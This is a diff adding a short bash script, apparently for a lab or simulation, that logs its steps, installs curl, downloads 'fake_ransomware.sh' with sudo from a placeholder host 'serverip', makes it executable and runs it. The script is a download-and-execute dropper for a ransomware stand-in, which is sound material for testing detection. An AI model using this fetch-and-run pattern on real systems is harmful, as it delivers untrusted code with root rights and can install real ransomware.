@@ -1,0 +1,32 @@
+#!/bin/bash
+
+#set up log
+touch /home/web/fake_ransomware.log
+logfile="/home/web/fake_ransomware.log"
+log() {
+        level=$1
+        shift 
+        user=$USER
+        echo "$(date -Iseconds) [$0] [$level] [user:$user] $*" >> "$logfile"
+}
+log INFO "starting script"
+
+#Download the fake ransomware
+log INFO "starting Download"
+sudo apt-get install curl
+if sudo curl --remote-name serverip/downloads/fake_ransomware.sh; then
+	log INFO "download succesed"
+else
+	log ERROR "download failed"
+fi
+
+#start the fake ransomware
+log INFO "starting next script"
+sudo chmod +rwx fake_ransomware.sh
+if [ -f "fake_ransomware.sh" ] && [ -x "fake_ransomware.sh" ]; then
+	./fake_ransomware.sh
+	log INFO "script worked"
+else
+	log ERROR "Script not worked"
+fi
+log INFO "script finished"
